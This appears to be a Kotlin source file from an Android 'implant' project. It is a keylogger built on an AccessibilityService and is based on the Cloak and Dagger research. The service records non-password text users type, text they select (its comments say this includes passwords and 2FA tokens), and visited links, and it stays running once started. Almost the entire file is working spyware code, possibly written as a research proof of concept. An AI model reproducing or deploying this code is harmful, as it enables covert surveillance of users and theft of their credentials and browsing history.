/*
* Uses an AccessibilityService as a keylogger.
* Based on Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop by
* Yanick Fratantonio, Chenxiong Qian, Simon P. Chung, Wenke Lee. 
* 
* Although this cannot see passwords from EditText due to Android's restrictions, we can see text
* the user selects, browser history and non-password text they enter.
* */
package com.cooperthecoder.implant

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Service
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class LoggingAccessibilityService : AccessibilityService() {

    companion object {
        @JvmStatic
        private val TAG: String = LoggingAccessibilityService::class.java.name
    }

    override fun onInterrupt() {
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return Service.START_STICKY
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // This event type is fired when text is entered in any EditText that is not a
                // password.
                for (string in event.strings()) {
                    logEvent(event, "Captured from EditText: $string")
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // This event type includes clicked links, as well as selected text.
                // We can record their browsing history as well as steal passwords and 2FA tokens
                // that are selected.
                for (string in event.selected()) {
                    logEvent(event, "Text selected: $string")
                }
                for (uri in event.uris()) {
                    logEvent(event, "URI detected: $uri")
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        serviceInfo = info
    }

    private fun logEvent(event: AccessibilityEvent, message: String) {
        Log.d(TAG + " - " + event.packageName, message)
    }

}